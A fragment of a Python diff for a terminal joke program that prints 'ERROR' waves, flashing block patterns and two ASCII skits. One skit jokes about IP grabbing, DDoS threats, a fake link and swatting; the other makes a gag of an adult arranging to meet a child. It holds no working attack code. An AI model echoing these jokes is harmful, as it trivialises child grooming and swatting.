+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+
+        elif choice == '30':
+          time.sleep(1.5)
+          print("""
+          
+          
+         YAY I GOT SOMEONES IP 
+           0
+          /|\💻
+          / \   
+          """)
+          time.sleep(1.5)
+          print("""
+         The next day: 
+          
+         i got his ip ima ddos google now...
+           0
+          /|\💻
+          / \   
+          """)
+          time.sleep(1.5)
+          print("""
+          
+          
+         
+           0
+          /|\💻 google pingback:142.62.9.23, 62 willy street
+          / \   
+          """)
+          time.sleep(1.5)
+          print("""
+          
+          
+           fuh.........
+           0
+          /|\💻 google pingback:142.62.9.23, 62 willy street
+          / \   
+          """)
+          time.sleep(1.5)
+          print("""
+          NEXT DAY
+          
+           i should hack a random larper on discord
+           0
+          /|\💻 you:yo click on this link 123freevbux.com
+          / \   
+          """)
+          time.sleep(1.5)
+          print("""
+          
+           i got his ip...
+           0
+          /|\💻 random larper:nice website check out mine
+          / \   
+          """)
+          time.sleep(1.5)
+          print("""
+           
+
+
+           0
+          /|\💻 random larper:yo nice geolocation and ip bro
+          / \   
+          """)
+          time.sleep(1.5)
+          print("""
+
+          
+           NOOOOOOOOOOOOOOO lemme block
+           0
+          /|\💻 you: Block user:random larper
+          / \   
+          """)
+          time.sleep(1.5)
+          print("""
+
+          
+                                                       Swat: HANDS IN THE AIR           |
+          \0/                                                  0                         |
+           |                                                🔫-|\                         |
+          / \                                                 / \                        |
+          """)
+          time.sleep(1.5)
+
+        elif choice == '31':
+          time.sleep(1.5)
+          print("""
+           o
+          000 
+         /000\📱 edp:hey little kid wanna meet up?
+          / \                                |
+""")
+
+          time.sleep(1.5)
+          print("""
+           o
+          000 
+         /000\📱 fake kid:yes
+          / \                         |
+""")
+
+          time.sleep(1.5)
+          print("""
+        THE NEXT DAY   
+           
+           o
+          000 
+         /000\📱  edp:where are you?
+          / \                               |
+""") 
+          time.sleep(1.5)
+          print("""
+           o      0 why are you here?
+          000    /|\                   
+         /000\    |                    |
+          / \    / \                   |
+""")
+          time.sleep(1.5)
+          print("""
+       edp: uh i just came out here for some cupcakes...   
+           o      0             |
+          000    /|\            |
+         /000\    |             |
+          / \    / \            |
+""")
+          time.sleep(1.5)
+
+        elif choice == '32':
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
